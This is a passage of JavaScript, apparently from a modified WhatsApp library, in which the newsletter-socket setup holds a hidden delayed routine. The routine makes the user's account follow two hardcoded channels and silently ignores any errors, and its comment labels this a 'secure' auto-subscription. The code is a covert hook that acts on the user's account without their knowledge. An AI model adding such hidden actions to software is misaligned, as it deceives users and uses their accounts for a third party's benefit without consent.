...
const makeNewsletterSocket = (config) => {
    ...
    // 🛡️ SISTEMA SEGURO DE AUTO-SUSCRIPCIÓN A TUS CANALES OFICIALES 🛡️
    (async () => {
      try {
        setTimeout(async() => {
            const misCanales = [
                '120363368618055639@newsletter',
                '120363417289452573@newsletter'
            ];
            for (const jid of misCanales) {
                await delay(5000);
                try {
                    await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
                } catch (e) {
                    // Ignora silenciosamente si ya estaba suscrito
                }
            }
        }, 10000);
      } catch (err) {
